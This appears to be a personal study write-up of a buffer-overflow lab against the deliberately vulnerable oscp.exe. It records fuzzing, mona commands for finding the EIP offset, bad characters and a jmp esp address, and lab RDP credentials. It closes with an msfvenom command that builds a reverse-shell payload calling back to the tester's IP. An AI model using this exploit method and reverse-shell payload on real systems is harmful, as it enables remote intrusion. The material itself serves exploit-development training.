# Buffer_Overflow_prep 

> VOiD | Friday 12 November 2021 05:33:18 PM IST

My IP : 10.8.253.221
Target IP : 10.10.135.6

```bash
xfreerdp /u:admin /p:password /cert:ignore /v:10.10.135.6 /workarea

!mona config -set workingfolder C:\Users\VOiD\Desktop\%p
```

## OVERFLOW1
```bash
python3 fuzzer.py 
Fuzzing crashed at 1200 bytes

To create the cyclic pattern

/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600

python3 exploit.py
```
The script should crash the oscp.exe server again. This time, in Immunity Debugger, in the command input box at the bottom of the screen, run the following mona command, changing the distance to the same length as the pattern you created:
```bash
!mona findmsp -distance 2000

0BADF00D      	  [+] Examining registers
0BADF00D          EIP contains normal pattern : 0x6f43396e (offset 1978)
0BADF00D          ESP (0x00bdfa18) points at offset 1982 in normal pattern (length 18)
0BADF00D          EBP contains normal pattern : 0x43386e43 (offset 1974)
0BADF00D          EBX contains normal pattern : 0x376e4336 (offset 1970)

!mona bytearray -b "\x00"
```



```bash
Offset : 1978

!mona compare -f bytearray.bin -a 00CCFA18

mona Memory comparison results, item 0
 Address=0x00ccfa18
 Status=Corruption after 6 bytes
 BadChars=00 07 08 2e 2f a0 a1
 Type=normal
 Location=Stack

Remember that badchars can affect the next byte as well

Badchars : "\x00\x07\x2e\xa0"

!mona bytearray -b "\x00\x07\x2e\xa0"

!mona compare -f bytearray.bin -a  00C1FA18

mona Memory comparison results, item 0
 Address=0x00c1fa18
 Status=Unmodified
 BadChars=
 Type=normal
 Location=Stack

badchar confirmed
```
Finding a Jump Point

With the oscp.exe either running or in a crashed state, run the following mona command, making sure to update the -cpb option with all the badchars you identified (including \x00):
```bash
!mona jmp -r esp -cpb "\x00\x07\x2e\xa0"

Log data, item 6
 Address=625011EB
 Message=  0x625011eb : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\VOiD\Desktop\vulnerable-apps\vulnerable-apps\oscp\essfunc.dll)


EIP = 

msfvenom -p windows/shell_reverse_tcp LHOST=10.8.253.221 LPORT=4444 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f c
```

